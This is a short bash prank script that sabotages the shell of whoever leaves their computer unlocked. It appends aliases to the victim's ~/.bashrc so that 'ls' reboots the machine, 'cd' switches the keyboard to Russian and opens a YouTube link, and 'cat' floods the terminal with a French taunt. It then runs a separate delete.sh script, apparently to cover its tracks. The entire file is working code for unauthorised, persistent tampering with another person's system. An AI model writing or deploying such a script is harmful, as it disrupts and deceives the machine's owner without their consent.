#!/bin/bash
SOURCE_FILE=".bashrc"
CMD1="reboot"
CMD2="yes laisse pas ton pc ouvert la prochaine fois"
CMD3="setxkbmap ru"
CMD5="setxkbmap fr"
CMD4="firefox https://www.youtube.com/watch\?v\=z7-sf26kGzE"

echo "alias ls=\"$CMD1\"" >> "$HOME/$SOURCE_FILE"
echo "alias cd=\"$CMD3;$CMD4\"" >> "$HOME/$SOURCE_FILE"
echo "alias cat=\"$CMD2\"" >> "$HOME/$SOURCE_FILE"
echo "alias ah=\"$CMD5\"" >> "$HOME/$SOURCE_FILE"
./delete.sh
